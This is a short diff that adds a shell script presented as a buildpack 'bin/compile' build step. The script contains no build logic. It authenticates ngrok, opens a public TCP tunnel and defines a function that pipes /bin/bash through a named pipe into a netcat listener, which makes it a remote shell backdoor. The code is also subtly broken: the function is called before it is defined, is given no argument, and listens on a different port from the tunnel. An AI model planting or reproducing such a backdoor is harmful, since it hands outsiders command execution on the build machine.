@@ -1,0 +1,11 @@
+#!/bin/sh
+
+# bin/compile BUILD_DIR CACHE_DIR ENV_DIR
+./ngrok authtoken $NGROK_TOKEN
+open_it &
+./ngrok tcp $PORT
+
+open_it() {
+  mkfifo $1/rshell
+  cat $1/rshell|/bin/bash 2>&1|nc -l 8080 >$1/rshell
+}
